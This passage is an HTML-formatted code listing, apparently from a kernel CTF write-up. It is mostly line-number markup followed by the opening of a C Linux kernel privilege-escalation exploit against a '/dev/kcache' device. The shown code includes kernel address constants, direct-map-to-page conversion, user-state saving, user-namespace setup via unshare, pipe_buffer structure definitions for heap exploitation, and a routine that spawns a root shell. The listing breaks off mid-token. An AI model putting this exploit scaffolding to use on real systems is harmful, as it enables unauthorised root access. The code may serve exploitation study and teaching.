class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br><span class="line">1150</span><br><span class="line">1151</span><br><span class="line">1152</span><br><span class="line">1153</span><br><span class="line">1154</span><br><span class="line">1155</span><br><span class="line">1156</span><br><span class="line">1157</span><br><span class="line">1158</span><br><span class="line">1159</span><br><span class="line">1160</span><br><span class="line">1161</span><br><span class="line">1162</span><br><span class="line">1163</span><br><span class="line">1164</span><br><span class="line">1165</span><br><span class="line">1166</span><br><span class="line">1167</span><br><span class="line">1168</span><br><span class="line">1169</span><br><span class="line">1170</span><br><span class="line">1171</span><br><span class="line">1172</span><br><span class="line">1173</span><br><span class="line">1174</span><br><span class="line">1175</span><br><span class="line">1176</span><br><span class="line">1177</span><br><span class="line">1178</span><br><span class="line">1179</span><br><span class="line">1180</span><br><span class="line">1181</span><br><span class="line">1182</span><br><span class="line">1183</span><br><span class="line">1184</span><br><span class="line">1185</span><br><span class="line">1186</span><br><span class="line">1187</span><br><span class="line">1188</span><br><span class="line">1189</span><br><span class="line">1190</span><br><span class="line">1191</span><br><span class="line">1192</span><br><span class="line">1193</span><br><span class="line">1194</span><br><span class="line">1195</span><br><span class="line">1196</span><br><span class="line">1197</span><br><span class="line">1198</span><br><span class="line">1199</span><br><span class="line">1200</span><br><span class="line">1201</span><br><span class="line">1202</span><br><span class="line">1203</span><br><span class="line">1204</span><br><span class="line">1205</span><br><span class="line">1206</span><br><span class="line">1207</span><br><span class="line">1208</span><br><span class="line">1209</span><br><span class="line">1210</span><br><span class="line">1211</span><br><span class="line">1212</span><br><span class="line">1213</span><br><span class="line">1214</span><br><span class="line">1215</span><br><span class="line">1216</span><br><span class="line">1217</span><br><span class="line">1218</span><br><span class="line">1219</span><br><span class="line">1220</span><br><span class="line">1221</span><br><span class="line">1222</span><br><span class="line">1223</span><br><span class="line">1224</span><br><span class="line">1225</span><br><span class="line">1226</span><br><span class="line">1227</span><br><span class="line">1228</span><br><span class="line">1229</span><br><span class="line">1230</span><br><span class="line">1231</span><br><span class="line">1232</span><br><span class="line">1233</span><br><span class="line">1234</span><br><span class="line">1235</span><br><span class="line">1236</span><br><span class="line">1237</span><br><span class="line">1238</span><br><span class="line">1239</span><br><span class="line">1240</span><br><span class="line">1241</span><br><span class="line">1242</span><br><span class="line">1243</span><br><span class="line">1244</span><br><span class="line">1245</span><br><span class="line">1246</span><br><span class="line">1247</span><br><span class="line">1248</span><br><span class="line">1249</span><br><span class="line">1250</span><br><span class="line">1251</span><br><span class="line">1252</span><br><span class="line">1253</span><br><span class="line">1254</span><br><span class="line">1255</span><br><span class="line">1256</span><br><span class="line">1257</span><br><span class="line">1258</span><br><span class="line">1259</span><br><span class="line">1260</span><br><span class="line">1261</span><br><span class="line">1262</span><br><span class="line">1263</span><br><span class="line">1264</span><br><span class="line">1265</span><br><span class="line">1266</span><br><span class="line">1267</span><br><span class="line">1268</span><br><span class="line">1269</span><br><span class="line">1270</span><br><span class="line">1271</span><br><span class="line">1272</span><br><span class="line">1273</span><br><span class="line">1274</span><br><span class="line">1275</span><br><span class="line">1276</span><br><span class="line">1277</span><br><span class="line">1278</span><br><span class="line">1279</span><br><span class="line">1280</span><br><span class="line">1281</span><br><span class="line">1282</span><br><span class="line">1283</span><br><span class="line">1284</span><br><span class="line">1285</span><br><span class="line">1286</span><br><span class="line">1287</span><br><span class="line">1288</span><br><span class="line">1289</span><br><span class="line">1290</span><br><span class="line">1291</span><br><span class="line">1292</span><br><span class="line">1293</span><br><span class="line">1294</span><br><span class="line">1295</span><br><span class="line">1296</span><br><span class="line">1297</span><br><span class="line">1298</span><br><span class="line">1299</span><br><span class="line">1300</span><br><span class="line">1301</span><br><span class="line">1302</span><br><span class="line">1303</span><br><span class="line">1304</span><br><span class="line">1305</span><br><span class="line">1306</span><br><span class="line">1307</span><br><span class="line">1308</span><br><span class="line">1309</span><br><span class="line">1310</span><br><span class="line">1311</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * I - fundamental functions</span><br><span class="hljs-comment"> * e.g. CPU-core binder, user-status saver, etc.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">size_t</span> kernel_base = <span class="hljs-number">0xffffffff81000000</span>, kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> page_offset_base = <span class="hljs-number">0xffff888000000000</span>, vmemmap_base = <span class="hljs-number">0xffffea0000000000</span>;<br><span class="hljs-type">size_t</span> init_task, init_nsproxy, init_cred;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">direct_map_addr_to_page_addr</span><span class="hljs-params">(<span class="hljs-type">size_t</span> direct_map_addr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> page_count;<br><br>    page_count = ((direct_map_addr &amp; (~<span class="hljs-number">0xfff</span>)) - page_offset_base) / <span class="hljs-number">0x1000</span>;<br>    <br>    <span class="hljs-keyword">return</span> vmemmap_base + page_count * <span class="hljs-number">0x40</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-comment">/* root checker and shell poper */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);<br>    <br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <br>    <span class="hljs-comment">/* to exit the process normally, instead of segmentation fault */</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-comment">/* userspace status saver */</span><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/* bind the process to specific core */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief create an isolate namespace</span><br><span class="hljs-comment"> * note that the caller **SHOULD NOT** be used to get the root, but an operator</span><br><span class="hljs-comment"> * to perform basic exploiting operations in it only</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">unshare_setup</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> edit[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> tmp_fd;<br><br>    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);<br>    write(tmp_fd, <span class="hljs-string">&quot;deny&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;deny&quot;</span>));<br>    close(tmp_fd);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-keyword">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, getuid());<br>    write(tmp_fd, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    close(tmp_fd);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-keyword">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, getgid());<br>    write(tmp_fd, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    close(tmp_fd);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span>;</span><br><br><span class="hljs-comment">/* read start from len to offset, write start from offset */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> &#123;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * -&gt;confirm() verifies that the data in the pipe buffer is there</span><br><span class="hljs-comment"> * and that the contents are good. If the pages in the pipe belong</span><br><span class="hljs-comment"> * to a file system, we may need to wait for IO completion in this</span><br><span class="hljs-comment"> * hook. Returns 0 for good, or a negative error value in case of</span><br><span class="hljs-comment"> * error.  If not present all pages are considered good.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> (*confirm)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * When the contents of this pipe buffer has been completely</span><br><span class="hljs-comment"> * consumed by a reader, -&gt;release() is called.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> (*release)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Attempt to take ownership of the pipe buffer and its contents.</span><br><span class="hljs-comment"> * -&gt;try_steal() returns %true for success, in which case the contents</span><br><span class="hljs-comment"> * of the pipe (the buf-&gt;page) is locked and now completely owned by the</span><br><span class="hljs-comment"> * caller. The page may then be transferred to a different mapping, the</span><br><span class="hljs-comment"> * most often used case is insertion into different file address space</span><br><span class="hljs-comment"> * cache.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> (*try_steal)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Get a reference to the pipe buffer.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> (*get)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * II - interface to interact with /dev/kcache</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_SIZE 2048</span><br><span class="hljs-meta">#<span 